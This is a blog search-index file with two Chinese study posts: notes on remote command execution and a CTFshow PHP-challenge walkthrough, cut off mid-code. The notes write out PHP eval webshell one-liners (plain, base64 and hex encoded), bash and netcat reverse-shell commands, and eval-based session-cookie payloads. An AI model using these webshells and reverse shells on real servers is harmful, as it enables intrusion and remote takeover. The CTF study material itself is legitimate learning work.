<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RCE补充</title>
      <link href="/post/56a911e3.html"/>
      <url>/post/56a911e3.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><a href="https://blog.csdn.net/weixin_46706771/article/details/119008895">RCE总结</a></p><h1 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a>无回显rce</h1><p><a href="https://blog.csdn.net/qq_45557476/article/details/121882666">rce无回显剖析</a></p><ul><li>无回显rce：在命令执行的时候，虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行</li><li>可以使用sleep命令通过是否延时来判断该条命令是否有执行，有延时则代表命令有执行：<code>?a=1;sleep 5</code></li></ul><h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><h2 id="可输入长度被限制"><a href="#可输入长度被限制" class="headerlink" title="可输入长度被限制"></a>可输入长度被限制</h2><ul><li><p>linux的一些特性</p><ul><li><code>&gt;a</code>：虽然没有输入但是会创建a这个文件</li><li><code>ls -t ls</code>：基于事件排序（从晚到早）</li><li><code>sh a</code>：sh会把a里面的每行内容当作命令来执行使用<code>|</code>进行命令拼接<code> #l\ s = ls</code></li><li><code>base64</code>使用base64编码避免特殊字符</li></ul></li><li><p>可写：<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code></p></li><li><p>将语句拆分写入（最后两句是重点）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">hp  &gt;1.p\\  &gt;d\&gt;\\  &gt;\ -\\  &gt;e64\\  &gt;bas\\  &gt;7\|\\  &gt;XSk\\  &gt;Fsx\\&gt;dFV\\  &gt;kX0\\  &gt;bCg\\  &gt;XZh\\  &gt;AgZ\\  &gt;waH\\  &gt;PD9\\  &gt;o\ \\  &gt;ech\\<span class="built_in">ls</span> -t&gt;0sh 0</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="没有限制且有写入权限"><a href="#没有限制且有写入权限" class="headerlink" title="没有限制且有写入权限"></a>没有限制且有写入权限</h2><ul><li><code>echo &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&quot; &gt; fuck.php</code></li></ul><h2 id="复制、压缩的方法"><a href="#复制、压缩的方法" class="headerlink" title="复制、压缩的方法"></a>复制、压缩的方法</h2><ul><li><code>copy flag.php 1.txt</code></li><li><code>mv flag.php flag.txt</code></li><li><code>cat flag.php &gt; flag.txt</code></li><li><code>tar cvf flag.tar flag.php</code></li><li><code>tar zcvf flag.tar.gz flag.php</code></li><li><code>echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php</code></li></ul><h1 id="DNSlog外带"><a href="#DNSlog外带" class="headerlink" title="DNSlog外带"></a>DNSlog外带</h1><ul><li>如果我们发起请求的目标不是IP地址而是域名的话，就一定会发生一次域名解析</li></ul><ul><li>那么假如有一个可控的二级域名，那么当它向下一层域名发起解析的时候，就能拿到它的域名解析请求</li><li>这就相当于配合dns请求完成对命令执行的判断，这就称之为dnslog，发起一个dns请求需要通过linux中的<code>ping</code>命令或者<code>curl</code>命令</li><li>需要了解的一些命令：<ul><li><code>sed</code>命令，可以实现对行的分：ls | sed -n ‘1p’ （显示第一行）</li><li><code>find</code><ul><li>-name：按名称查找；根据目标文件的名称进行查找，允许使用<code>*</code>及<code>?</code>通配符</li><li>-size：按文件大小查找；一般使用<code>+</code>、<code>-</code>号设置超过或小于指定的大小作为查找条件，常用的容量单位包括kB（注意k是小写）、MB、GB；</li><li>-user：按文件属主查找；</li><li>-type：按文件类型查找；类型指的是普通文件（f）、目录（d）、块设备文件（b）、字符设备文件（c）等</li></ul></li><li>[Linux命令通配符](<a href="https://www.cnblogs.com/ysuwangqiang/p/11364173.html#:~:text=Linux%E4%B8%AD%E9%80%9A%E9%85%8D%E7%AC%A6">https://www.cnblogs.com/ysuwangqiang/p/11364173.html#:~:text=Linux中通配符</a>. 　　通配符是由shell处理的%2C 它只会出现在 命令的“参数”里。. 当shell在“参数”中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换(路径扩展)；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。. 总之，通配符 实际上就是一种shell实现的路径扩展功能。. 在,SHELL中的通配符. 帮助手册：%23 man 7 glob . 匹配任意长度的任意字符，可以是0个. 匹配任意单个字符，必须是1个.)</li></ul></li></ul><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="什么是反弹sell？"><a href="#什么是反弹sell？" class="headerlink" title="什么是反弹sell？"></a>什么是反弹sell？</h2><blockquote><p>通俗来说，shell就是实现用户命令的接口，通过该接口我们能实现对计算机的控制(root权限)，而反弹shell就是将shell反弹给攻击者，从而达到让攻击者可以在自己的机器上执行shell命令，从而操控受害者的计算机。</p></blockquote><h2 id="为什么要反弹shell？"><a href="#为什么要反弹shell？" class="headerlink" title="为什么要反弹shell？"></a>为什么要反弹shell？</h2><blockquote><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p><p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p><p>2.它的ip会动态改变，你不能持续控制。</p><p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p><p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p><p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p></blockquote><h2 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a>linux文件描述符</h2><ul><li><p>可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p></li><li><p>当Linux启动的时候会默认打开三个文件描述符(0,1,2)</p></li></ul><blockquote><p>标准输入standard input 0 （默认设备键盘）<br>标准输出standard output 1（默认设备显示器）<br>错误输出：error output 2（默认设备显示器）</p></blockquote><ul><li>注意：<ul><li>以后再打开文件，描述符可以依次增加</li><li>一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。</li><li>文件所有输入输出都是由该进程所有打开的文件描述符控制的。</li></ul></li></ul><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><ul><li><p>输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符</p></li><li><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p><ul><li>输入重定向 <code>&lt; &lt;&lt;</code></li><li>输出重定向 <code>&gt; &gt;&gt;</code></li></ul></li><li><p>重点：</p><ul><li>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向，然后在把重定向去掉，执行指令</li><li>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果</li><li><code>&lt; </code>是对标准输入 0 重定向 ，<code>&gt; </code>是对标准输出 1 重定向</li><li>重定向就是针对文件描述符的操作</li></ul></li></ul><h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><p>格式：<code>[n]&lt; word </code>（注意[n]与&lt;之间没有空格）</p><p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）</p><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><p>格式：<code>[n]&gt; word</code></p><p>说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出）</p><h3 id="标准输出与标准错误输出重定向"><a href="#标准输出与标准错误输出重定向" class="headerlink" title="标准输出与标准错误输出重定向"></a>标准输出与标准错误输出重定向</h3><p>格式：<code>&amp;&gt; word &gt;&amp; word</code></p><p>说明：将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于<code>&gt; word 2&gt;&amp;1</code>（2&gt;&amp;1是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的）</p><h3 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h3><p>格式：<code>[n]&lt;&amp;[m] / [n]&gt;&amp;[m]</code>(这里所有字符之间不要有空格)</p><p>说明：</p><blockquote><p>这里两个都是将文件描述符 n 复制到 m ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p><p>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</p><p>这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p></blockquote><h3 id="exec-绑定重定向"><a href="#exec-绑定重定向" class="headerlink" title="exec 绑定重定向"></a>exec 绑定重定向</h3><p>格式：<code>exec [n] &lt;/&gt; file/[n]</code></p><p>说明：上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p><ul><li>重点：<ul><li>格式：<code>[n]&lt;&gt;word</code></li><li>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</li></ul></li></ul><h2 id="常见的反弹shell"><a href="#常见的反弹shell" class="headerlink" title="常见的反弹shell"></a>常见的反弹shell</h2><h3 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h3><blockquote><p><code>bash -i &gt; /dev/tcp/ip/port</code></p></blockquote><ul><li>将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。</li></ul><blockquote><p><code>bash -i &lt; /dev/tcp/ip/port</code></p></blockquote><ul><li>将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。</li></ul><blockquote><p><code>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1</code></p></blockquote><ul><li>基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出。</li></ul><blockquote><p><code>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1</code></p></blockquote><ul><li>攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令。</li></ul><h3 id="nc命令"><a href="#nc命令" class="headerlink" title="nc命令"></a>nc命令</h3><blockquote><p><code>nc -e /bin/bash ip port</code>：nc反弹</p></blockquote><blockquote><p><code>nc -lvp port</code>：监听端口</p></blockquote><h3 id="gt-amp-、-amp-gt"><a href="#gt-amp-、-amp-gt" class="headerlink" title="&gt;&amp;、&amp;&gt;"></a>&gt;&amp;、&amp;&gt;</h3><ul><li>解决受害机能看到攻击机执行命令的情况</li></ul><blockquote><p><code>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1</code></p><p><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p></blockquote><h1 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h1><ul><li>无参数rce：通过没有参数的函数达到命令执行的目的。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span>===<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])&#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>如果<code>&#39;;&#39;===preg_replace(...)</code>，那么就执行exp传递的命令</li><li><code>\</code> : 转义字符不多说了</li><li><code>[a-z,_]+</code> : <code>[a-z,_]</code>匹配小写字母和下划线 <code>+</code>表示1到多个</li><li><code>(?R)?</code> : <code>(?R)</code>代表当前表达式，就是这个(/[a-z,_]+((?R)?)/)，所以会一直递归，<code>?</code>表示递归当前表达式0次或1次（若是<code>(?R)*</code>则表示递归当前表达式0次或多次，例如它可以匹配<code>a(b(c()d()))</code>）</li></ul><blockquote><p>简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下<code>;</code>,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 <code>phpinfo();</code>，它被替换后就只剩下<code>;</code>，那么根据判断条件就会执行<code>phpinfo();</code>。</p><p><code>(?R)?</code>能匹配的只有<code>a(); a(b()); a(b(c()));</code>这种类型的。比如传入<code>a(b(c()));</code>，第一次匹配后，就剩<code>a(b());</code>，第二次匹配后，<code>a();</code>，第三次匹配后就只剩下<code>;</code>了，最后<code>a(b(c()));</code>就会被eval执行。</p></blockquote><h2 id="常见绕过姿势"><a href="#常见绕过姿势" class="headerlink" title="常见绕过姿势"></a>常见绕过姿势</h2><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><ul><li>获取全部HTTP请求头信息</li></ul><blockquote><p><code>getallheaders()</code>返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好<code>implode()</code>这个函数就能胜任。</p></blockquote><ul><li><code>implode()</code>：将一个一维数组的值转化为字符串</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">getallheaders</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>利用上述代码即可将HTTP请求头的信息输出，此时随意构造一个请求头，内容为恶意代码并将后面内容注释掉，即可获得信息。</li></ul><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><ul><li>返回由所有已定义变量所组成的数组</li></ul><blockquote><p><code>var_dump(get_defined_vars());</code>可以将所有已定义的变量以二维数组的形式输出。</p></blockquote><ul><li><code>current()</code>：返回数组中的当前值</li></ul><h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h3><ul><li><p>获取/设置当前会话ID，这个函数来获取cookie中的<code>phpsessionid</code>了，并且这个值我们是可控的。</p></li><li><p>限制：<strong>文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）</strong></p></li><li><p>解决办法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来。</p><ul><li><code>hex2bin()</code>：转换十六进制字符串为二进制字符串</li></ul></li><li><p>使用前提条件：需要开启<code>session_start()</code>所以即可构造<code>eval(hex2bin(session_id(session_start())))</code></p></li><li><p>使用此payload时，需要构造cookie请求头，<code>Cookie: PHPSESSID=执行代码的16进制</code></p></li></ul><h2 id="配合使用的函数"><a href="#配合使用的函数" class="headerlink" title="配合使用的函数"></a>配合使用的函数</h2><ul><li><code>getchwd()</code> 函数返回当前工作目录。</li><li><code>scandir()</code> 函数返回指定目录中的文件和目录的数组。</li><li><code>dirname()</code> 函数返回路径中的目录部分。</li><li><code>chdir()</code> 函数改变当前的目录。</li><li><code>readfile()</code> 输出一个文件。</li><li><code>current()</code> 返回数组中的当前单元, 默认取第一个值。</li><li><code>pos()</code> current() 的别名。</li><li><code>next()</code> 函数将内部指针指向数组中的下一个元素，并输出。</li><li><code>end()</code> 将内部指针指向数组中的最后一个元素，并输出。</li><li><code>array_rand()</code> 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</li><li><code>array_flip()</code> array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</li><li><code>array_slice()</code> 函数在数组中根据条件取出一段值，并返回。</li><li><code>array_reverse()</code> 函数返回翻转顺序的数组。</li><li><code>chr()</code> 函数从指定的 ASCII 值返回字符。</li><li><code>hex2bin()</code> — 转换十六进制字符串为二进制字符串。</li><li><code>getenv()</code> 获取一个环境变量的值(在7.1之后可以不给予参数)。</li><li><code>localeconv()</code> 函数返回一包含本地数字及货币格式信息的数组。</li><li><code>highlight_file()</code>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-WEB入门</title>
      <link href="/post/87b124cd.html"/>
      <url>/post/87b124cd.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h1><h2 id="web89-intval"><a href="#web89-intval" class="headerlink" title="web89(intval)"></a>web89(intval)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num[]=1</code></p><ul><li>preg_match()：只能处理字符串，当传入的是数组时会返回false</li><li>intval()：变量不能是array和object格式  成功时返回var的integer值，失败时返回0，空的array返回0，非空的array返回1</li></ul><h2 id="web90-强比较"><a href="#web90-强比较" class="headerlink" title="web90(强比较)"></a>web90(强比较)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num=4476[a-z or .!@$%^\()等]</code></p><ul><li>intval()：如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是 - ，则从第二个开始算起</li><li>===：在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</li></ul><h2 id="web91-正则-m"><a href="#web91-正则-m" class="headerlink" title="web91(正则-m)"></a>web91(正则-m)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no no no no no&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?cmd=%0aphp</code></p><ul><li>/^php$/：正则表达式，匹配开始和结束位置，简单来说就是参数值为php</li><li>i：不区分大小写</li><li>m：多行匹配</li></ul><h2 id="web92-弱比较"><a href="#web92-弱比较" class="headerlink" title="web92(弱比较)"></a>web92(弱比较)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> == <span class="number">4476</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>, <span class="number">0</span>) == <span class="number">4476</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num=010574 or 4476e1</code></p><ul><li>==：在进行比较的时候，会先将字符串类型转化成相同类型，再比较</li></ul><h2 id="web93-进制转换"><a href="#web93-进制转换" class="headerlink" title="web93(进制转换)"></a>web93(进制转换)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num=010574</code></p><ul><li>intval():  第二个参数为0时，通过对变量检测来判断<ul><li>0b??：二进制</li><li>0???：八进制</li><li>0x??：十六进制</li></ul></li></ul><h2 id="web94-strpos"><a href="#web94-strpos" class="headerlink" title="web94(strpos)"></a>web94(strpos)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num= 010574</code></p><ul><li>strpos()：返回在字符串首次出现的位置，如果没找到返回false</li></ul><h2 id="web95-strpos，intval，-，"><a href="#web95-strpos，intval，-，" class="headerlink" title="web95(strpos，intval，==，===)"></a>web95(strpos，intval，==，===)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num= 010574</code></p><h2 id="web96-php-filter"><a href="#web96-php-filter" class="headerlink" title="web96(php://filter/)"></a>web96(php://filter/)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 